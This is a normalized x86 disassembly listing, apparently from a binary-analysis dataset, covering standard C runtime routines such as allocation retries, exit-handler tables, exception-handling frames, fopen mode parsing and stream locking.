test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_413ea8
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_413c79
add esp 0x14
pop ebp
retn
sub_413ed3
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_410212
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_413f18
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41add0
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_413f64
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4102dc
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_413fb2
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41aeee
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_414004
push 0x10
push r--data
call sub_4143e0
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_410cee
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_417d56
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_414425
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41409e
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_4140a7
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_4140d7
mov edi edi
push ebp
mov ebp esp
call sub_4189c8
push [ ebp + 0x8 ]
call sub_41881d
push [ rw-data ]
call sub_413495
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_414100
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_414155
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_414172
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_414196
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_419f87
push r--data
push r--data
call sub_414172
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_414660
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_418ee1
call sub_40eaf5
mov eax r--data
mov [ esp ] r--data
call sub_414155
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_414660
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_41421b
push 0x18
push r--data
call sub_4143e0
push 0x8
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414332
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_414425
retn
mov [ rw-data ] ebx
push 0x8
call sub_417c49
pop ecx
push [ ebp + 0x8 ]
call sub_41412b
push r--data
mov eax r--data
call sub_414155
pop ecx
push [ rw-data ]
call sub_413495
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_414155
pop ecx
push [ rw-data ]
call sub_413495
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_41348c
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_413495
mov edi eax
call sub_41348c
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_413495
mov edi eax
push [ rw-data ]
call sub_413495
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_414391
mov edi edi
push esi
call sub_41348c
mov esi eax
push esi
call sub_417538
push esi
call sub_41b199
push esi
call sub_40ecbd
push esi
call sub_41b18a
push esi
call sub_41b17b
push esi
call sub_41af69
push esi
call sub_41471d
push esi
call sub_419cda
push sub_41435d
call sub_41341a
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_4143e0
push sub_414440
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_414440
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40e1e0
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40e1e0
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_414ffc
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_414fb2
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40e1e0
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40e1e0
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_414fe2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_414ffc
mov eax [ ebp + 0xc ]
push r--data
call sub_414660
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40e1e0
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_414fc9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40e1e0
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_4145d0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_414610
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_414660
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_414440
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_4145d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_414610
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41471e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_4136a5
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_414890
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_41b25f
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_414910
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_413f18
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_413f18
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_4149e1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_417d23
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_414a22
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_417d23
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_414a54
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_417c49
pop ecx
pop ebp
retn
sub_414a90
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_417c49
pop ecx
pop ebp
retn
sub_414abf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov [ ebp + 0xc ] 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edx [ ecx + 0x7f ]
mov edi 0x4000
or [ ebp - 0x4 ] 0x1
mov [ ebp + 0xc ] ebx
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] bl
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
push edi
cmp al bl
je r-xdata
mov [ ebp + 0xc ] 0x301
jmp r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_41bb78
add esp 0x14
test eax eax
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
jmp r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
test [ ebp + 0xc ] 0x1000
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
inc esi
push 0x3
push esi
push r--data
call sub_41bf47
add esp 0xc
test eax eax
jne r-xdata
or [ ebp + 0xc ] 0x1000
xor ecx ecx
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
dec eax
je r-xdata
or [ ebp + 0xc ] 0x20
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc esi
mov al [ esi ]
cmp al bl
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x3
jmp r-xdata
cmp ecx ebx
je r-xdata
or [ ebp + 0xc ] 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
test [ ebp + 0xc ] 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] 0x20
je r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0xfffffffe
or eax 0x2
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x4 ]
and eax 0xfffffffc
or eax edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test [ ebp + 0xc ] 0xc000
jne r-xdata
test [ ebp + 0xc ] 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] 0x20
je r-xdata
or [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp + 0xc ] 0x40
jmp r-xdata
or [ ebp + 0xc ] edx
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_41bdc3
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push 0x8
push r--data
push esi
call sub_41bdc3
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebp + 0xc ] 0x40000
jmp r-xdata
or [ ebp + 0xc ] 0x10
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push 0x7
push r--data
push esi
call sub_41bdc3
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebp + 0xc ] 0x20000
jmp r-xdata
add esi 0x7
or [ ebp + 0xc ] 0x10000
jmp r-xdata
sub_414d88
push 0x10
push r--data
call sub_4143e0
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414eb7
mov eax edi
call sub_414425
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_413ed3
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_41b1a8
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_410135
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_414a22
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_417c60
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_414a90
pop ecx
pop ecx
sub_414ec0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_414f50
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_41c079
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_41c098
jmp r-xdata
sub_414f50
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40e1e0
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_414ec0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_414fb2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_414fe2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_415013
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_40e5f8
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_41a147
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
